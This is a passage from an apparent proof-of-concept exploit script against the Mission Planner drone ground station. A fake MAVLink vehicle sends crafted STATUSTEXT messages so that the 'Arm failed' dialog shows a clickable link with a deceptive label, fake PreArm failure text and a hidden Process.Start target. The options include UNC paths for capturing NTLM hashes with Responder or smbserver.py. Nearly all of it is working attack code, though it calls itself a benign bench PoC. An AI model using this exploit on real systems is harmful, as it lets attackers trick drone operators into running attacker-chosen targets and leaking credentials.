                            req_opcode=self.OP_BURST_READ if burst else self.OP_READ,
                            data=bytes([self.ERR_EOF]))
            return
        if not burst:
            chunk = content[offset:offset + min(req["size"] or self.MAX_DATA, self.MAX_DATA)]
            self._ftp_reply(req, self.OP_ACK, size=len(chunk), req_opcode=self.OP_READ,
                            offset=offset, data=chunk)
            return
        # Burst path: stream chunks until EOF, marking burst_complete on the last.
        pos = offset
        while pos < len(content):
            chunk = content[pos:pos + self.MAX_DATA]
            pos += len(chunk)
            last = pos >= len(content)
            self._ftp_reply(req, self.OP_ACK, size=len(chunk), req_opcode=self.OP_BURST_READ,
                            burst=1 if last else 0, offset=pos - len(chunk), data=chunk)
        if self.verbose:
            attack("served MAVFTP BurstReadFile: %d bytes from offset %d" % (len(content) - offset, offset))


# ---------------------------------------------------------------------------
# self-test: confirm the hand-rolled CRC_EXTRA matches known + audited values.
# Run:  python3 poc_G03_mp_statustext_link_shellexec.py --selftest
# ---------------------------------------------------------------------------
def _selftest():
    # CAMERA_INFORMATION (non-extension fields only) must yield the dialect's 92.
    cam = [("uint32_t", "time_boot_ms", 0), ("uint8_t", "vendor_name", 32),
           ("uint8_t", "model_name", 32), ("uint32_t", "firmware_version", 0),
           ("float", "focal_length", 0), ("float", "sensor_size_h", 0),
           ("float", "sensor_size_v", 0), ("uint16_t", "resolution_h", 0),
           ("uint16_t", "resolution_v", 0), ("uint8_t", "lens_id", 0),
           ("uint32_t", "flags", 0), ("uint16_t", "cam_definition_version", 0),
           ("char", "cam_definition_uri", 140)]
    got = _crc_extra("CAMERA_INFORMATION", cam)
    assert got == 92, "CAMERA_INFORMATION crc_extra %d != 92" % got
    assert _crc_extra(*_MSG_COMPONENT_METADATA[1:]) == 182, "COMPONENT_METADATA crc_extra mismatch"
    assert _crc_extra(*_MSG_COMPONENT_INFORMATION[1:]) == 0, "COMPONENT_INFORMATION crc_extra mismatch"
    ok("selftest OK: CRC_EXTRA(CAMERA_INFORMATION)=92, COMPONENT_METADATA=182, COMPONENT_INFORMATION=0")
# ============================== end embedded harness ==============================
from pymavlink import mavutil


def extra(p):
    p.add_argument("--url", default="http://127.0.0.1:8000/p",
                   help="generic link target -- works for http(s)://, file://, or any "
                        "registered protocol handler (e.g. 'mailto:x@y.com', 'ms-settings:', "
                        "'search-ms:query=x'). <=50-byte total markup budget. default localhost HTTP")
    p.add_argument("--unc", nargs="?", const=r"\\192.0.2.1\s\x", default=None, metavar="\\\\HOST\\SHARE\\PATH",
                   help=r"UNC/SMB target -- triggers an outbound SMB connection (NTLM coercion). "
                        r"Bare --unc uses a non-routable RFC-5737 marker (\\192.0.2.1\s\x), nothing "
                        r"is contacted. Pass a real one to test against your own listener, e.g. "
                        r"--unc '\\10.0.0.5\share\x' with smbserver.py/Responder/a Windows file share "
                        r"running on 10.0.0.5 to capture the Net-NTLMv2 hash.")
    p.add_argument("--raw", default=None,
                   help="full attacker string verbatim, no [link;...] wrapping/escaping -- use this "
                        "for payload shapes --url/--unc don't cover (e.g. you want a non-default "
                        "label, or a target string containing ';' or ']' that would break the parser).")
    p.add_argument("--label", default="click-me",
                   help="clickable link text shown in the dialog (default 'click-me'). This is "
                        "CustomMessageBox.cs:92 Group 3 -- INDEPENDENT of the Group 2 target at :91. "
                        "A WinForms LinkLabel exposes no hover/status-bar reveal of .Tag, so the "
                        "operator cannot inspect where it really goes. With --span the label is no "
                        "longer bound by the 50-byte budget.")
    p.add_argument("--pretext", action="append", default=[], metavar="LINE",
                   help="extra STATUSTEXT line prepended to the dialog body, repeatable. "
                        "FlightData.cs:1048 sb.AppendLine()s EVERY STATUSTEXT seen during the arm "
                        "attempt, so the 50-byte cap is PER MESSAGE, not per dialog. Use this to "
                        "build a plausible PreArm failure narrative, e.g. "
                        "--pretext 'PreArm: Compass not calibrated'. ASCII only "
                        "(FlightData.cs:1048 decodes with Encoding.ASCII).")
    p.add_argument("--ambient", type=float, default=0.0, metavar="SECONDS",
                   help="rebroadcast the whole line set every SECONDS for non-arm "
                        "STATUSTEXT-fed dialogs. Default 0 = OFF. Anything arriving "
                        "inside FlightData.cs's arm subscribe window (1046-1051) is "
                        "AppendLine()d into that dialog too, so leaving this on stacks "
                        "duplicate copies of every line in the 'Arm failed' body.")
    p.add_argument("--span", action="store_true",
                   help="allow the [link;...] markup to span several STATUSTEXT messages. .NET's "
                        "negated class [^\\]] matches the CRLF that AppendLine inserts (Singleline "
                        "only affects '.'), so the parser at CustomMessageBox.cs:87 still matches. "
                        "The split is always placed inside the LABEL, never the URL -- a CRLF in "
                        "the URL would corrupt the Process.Start target.")


def chunk_markup(url, label, limit=50):
    """Split '[link;URL;LABEL]' into <=limit-byte STATUSTEXT chunks.

    The split point is always inside LABEL: '[link;' + URL + ';' must survive
    intact in the first chunk or the CRLF that FlightData.cs:1048 inserts would
    land inside the Process.Start target.
    """
    head = "[link;%s;" % url
    tail = "%s]" % label
    if len(head.encode("utf-8")) + 1 > limit:
        raise ValueError(
            "URL too long: '[link;URL;' is %d bytes, leaving no room for a label "
            "in the first %d-byte STATUSTEXT. Shorten the URL/UNC path."
            % (len(head.encode("utf-8")), limit))
    def _cut(text, cap):
        """Cut at <=cap chars, preferring a '/' boundary so a bait URL wraps
        naturally instead of mid-token (cosmetic, but it is the whole point of
        the label)."""
        if len(text) <= cap:
            return cap
        window = text[:cap]
        slash = window.rfind("/")
        if slash > 0 and (cap - slash) <= 14:
            return slash + 1
        return cap

    first_cap = _cut(tail, limit - len(head.encode("utf-8")))
    chunks = [head + tail[:first_cap]]
    rest = tail[first_cap:]
    while rest:
        cut = _cut(rest, limit)
        chunks.append(rest[:cut])
        rest = rest[cut:]
    return chunks


def main():
    banner("G03: Mission Planner STATUSTEXT [link;...] -> Process.Start")
    warn("BENIGN PoC. Authorized localhost/bench Mission Planner only.")

    v = FakeVehicle.from_cli("G03 statustext link shellexec", extra_args=extra)
    a = v._args

    # Build the STATUSTEXT line list. FlightData.cs:1046-1051 AppendLine()s every
    # message seen during the arm attempt, so pretext lines and a spanning markup
    # all land in the one "Arm failed" dialog body.
    url = a.unc if a.unc is not None else a.url
    if a.raw is not None:
        markup_chunks = [a.raw]
    elif a.span:
        try:
            markup_chunks = chunk_markup(url, a.label)
        except ValueError as e:
            warn(str(e))
            return
    else:
        markup_chunks = ["[link;%s;%s]" % (url, a.label)]

    lines = list(a.pretext) + markup_chunks

    over = False
    observe("STATUSTEXT lines (FlightData.cs:1048 AppendLine()s each one):")
    for line in lines:
        n = len(line.encode("utf-8"))
        flag = "  <-- OVER 50, WILL BE TRUNCATED" if n > 50 else ""
        if n > 50:
            over = True
        observe("  [%2d B]%s %r" % (n, flag, line))
        try:
            line.encode("ascii")
        except UnicodeEncodeError:
            warn("  ^ non-ASCII: FlightData.cs:1048 decodes with Encoding.ASCII, "
                 "these bytes will render as '?'")
    if over and not a.span:
        warn("Over budget. Use --span to split the markup across messages, or shorten "
             "the URL/label.")

    if a.raw is None:
        observe("LinkLabel visible text : %r" % a.label)
        observe("Process.Start target   : %r" % url)
        if a.label != url:
            observe("  ^ these differ. CustomMessageBox.cs:91-92 reads them from separate "
                    "regex groups; LinkLabel.Tag is not surfaced in the UI, so the operator "
                    "cannot see the real target.")
    observe("Sinks: CustomMessageBox.cs:175 Process.Start / Common.cs:455 OpenUrl")
    if a.unc is not None:
        observe("UNC target -- catch it with:  sudo responder -I <iface>   (or impacket "
                "smbserver.py -smb2support s .)")
    else:
        observe("If using HTTP, run a catcher:  python3 -m http.server 8000")

    v._poc_statustext_lines = lines   # consumed by _rx_loop's arm-command handler

    v.start()
    if not v.wait_for_gcs():
        warn("No GCS connected; exiting.")
        return
    ok("GCS connected. Emitting the malicious STATUSTEXT link markup.")
    attack("Press ARM in Mission Planner -- the arm will be rejected and the")
    attack("'Arm failed' dialog will carry the clickable link. Click it.")
    if a.ambient > 0:
        attack("(Also rebroadcasting every %.1fs for non-arm STATUSTEXT-fed dialogs. "
               "Expect DUPLICATED lines in the arm dialog: anything arriving inside "
               "FlightData.cs's subscribe window gets AppendLine()d too.)" % a.ambient)
    else:
        observe("Ambient rebroadcast is off (default). The arm handler delivers every "
                "line at the moment it matters; rebroadcasting stacks duplicate copies "
                "into the dialog body. Use --ambient SECONDS only when targeting a "
                "non-arm STATUSTEXT-fed dialog.")
    try:
        import time
        while True:
            if a.ambient > 0:
                for line in lines:
                    v.send_statustext(line, severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL)
                time.sleep(a.ambient)
            else:
                time.sleep(0.5)
    except KeyboardInterrupt:
        warn("Ctrl-C — done.")
        v.stop()


if __name__ == "__main__":
    main()
